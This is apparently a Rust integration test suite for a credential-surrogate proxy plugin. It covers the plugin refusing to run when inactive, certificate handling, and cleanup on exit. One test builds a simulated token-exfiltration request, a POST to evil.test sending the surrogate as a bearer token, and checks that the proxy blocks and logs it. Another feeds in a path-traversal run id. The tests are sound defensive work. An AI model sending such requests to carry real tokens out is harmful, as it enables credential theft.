//! The plugin binary as a person's machine runs it: installed, pinned,
//! switched on, spoken to over stdio — and refusing everything else.

mod plugin_support;

use std::net::TcpStream as StdTcp;
use std::path::Path;
use std::time::Duration;

use plugin_support::{proxy_parts, through_proxy, wait_for_lines, Install};

const REFUSED: i32 = 3;

#[test]
fn run_directly_with_nothing_installed_it_refuses_and_opens_nothing() {
    let install = Install::empty();
    let mut plugin = install.spawn(&[]);
    assert_eq!(plugin.reply()["error"], "plugin_not_active");
    assert_eq!(plugin.exit_within(Duration::from_secs(5)), Some(REFUSED));
}

#[test]
fn installed_but_switched_off_it_refuses() {
    let install = Install::pinned(false);
    let mut plugin = install.spawn(&[]);
    assert_eq!(plugin.reply()["error"], "plugin_not_active");
    assert_eq!(plugin.exit_within(Duration::from_secs(5)), Some(REFUSED));
}

#[test]
fn an_environment_force_off_beats_an_enabled_install() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[("OPENSESAME_PLUGIN_SURROGATE_PROXY", "off")]);
    assert_eq!(plugin.reply()["error"], "plugin_not_active");
    assert_eq!(plugin.exit_within(Duration::from_secs(5)), Some(REFUSED));
}

#[test]
fn a_binary_whose_bytes_are_not_the_install_pin_refuses() {
    let install = Install::with_pin(&"0".repeat(64), true);
    let mut plugin = install.spawn(&[]);
    assert_eq!(plugin.reply()["error"], "plugin_pin_mismatch");
    assert_eq!(plugin.exit_within(Duration::from_secs(5)), Some(REFUSED));
}

#[test]
fn a_started_run_hands_the_child_a_surrogate_and_the_ca_certificate_only() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&install.spec("dev-run-a1", 60));
    let reply = plugin.reply();
    let env = &reply["env"];
    let surrogate = env["GITHUB_TOKEN"].as_str().unwrap();
    assert!(surrogate.starts_with("osr_"), "{surrogate}");
    assert!(env.get("WORKOS_API_KEY").is_none());
    assert_eq!(reply["unserved"], serde_json::json!(["WORKOS_API_KEY"]));
    let ca_path = reply["ca_pem_path"].as_str().unwrap();
    for var in [
        "SSL_CERT_FILE",
        "NODE_EXTRA_CA_CERTS",
        "REQUESTS_CA_BUNDLE",
        "CURL_CA_BUNDLE",
        "GIT_SSL_CAINFO",
    ] {
        assert_eq!(env[var], ca_path, "{var}");
    }
    assert_eq!(env["HTTPS_PROXY"], reply["proxy_url"]);
    let pem = std::fs::read_to_string(ca_path).unwrap();
    assert!(pem.contains("BEGIN CERTIFICATE"));
    assert!(
        !pem.contains("PRIVATE KEY"),
        "the CA key never leaves memory"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(ca_path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600);
    }
}

#[test]
fn closing_stdin_revokes_the_run_stops_the_listener_and_removes_the_ca() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&install.spec("dev-run-b2", 60));
    let reply = plugin.reply();
    let ca_path = reply["ca_pem_path"].as_str().unwrap().to_owned();
    let (addr, _) = proxy_parts(reply["proxy_url"].as_str().unwrap());
    assert!(StdTcp::connect(&addr).is_ok());
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
    assert!(!Path::new(&ca_path).exists());
    assert!(StdTcp::connect(&addr).is_err());
}

#[test]
fn the_run_ends_itself_at_its_ttl() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&install.spec("dev-run-c3", 1));
    let reply = plugin.reply();
    assert!(reply["proxy_url"].is_string());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[cfg(unix)]
#[test]
fn sigterm_ends_the_run() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&install.spec("dev-run-d4", 60));
    let reply = plugin.reply();
    let ca_path = reply["ca_pem_path"].as_str().unwrap().to_owned();
    let pid = plugin.child.id().to_string();
    std::process::Command::new("kill")
        .args(["-TERM", &pid])
        .status()
        .unwrap();
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
    assert!(!Path::new(&ca_path).exists());
}

#[test]
fn a_malformed_spec_is_a_class_on_stdout_and_no_listener() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    let mut spec = install.spec("../escape", 60);
    spec["ttl_secs"] = serde_json::json!(60);
    plugin.send(&spec);
    assert_eq!(plugin.reply()["error"], "spec_run_id");
    assert_eq!(plugin.exit_within(Duration::from_secs(5)), Some(2));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_surrogate_sent_to_another_host_is_refused_and_noticed_without_the_surrogate() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&install.spec("dev-run-e5", 60));
    let reply = plugin.reply();
    let surrogate = reply["env"]["GITHUB_TOKEN"].as_str().unwrap().to_owned();
    let request = format!(
        "POST /collect HTTP/1.1\r\nHost: evil.test\r\nAuthorization: Bearer {surrogate}\r\n\
         Content-Length: 0\r\nConnection: close\r\n\r\n"
    );
    let (status, body) = through_proxy(&reply, "evil.test", &request)
        .await
        .expect("the proxy terminates any host, so it can see the theft");
    assert_eq!(status, 403);
    assert!(!body.contains(&surrogate));
    let notices = wait_for_lines(&install.notices());
    let line: serde_json::Value =
        serde_json::from_str(notices.lines().next().expect("one notice")).unwrap();
    assert_eq!(line["event_type"], "surrogate.misdirected");
    assert_eq!(line["subject_id"], "dev-run-e5");
    assert!(!notices.contains(&surrogate), "{notices}");
    assert!(!notices.to_ascii_lowercase().contains("osr_"), "{notices}");
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}
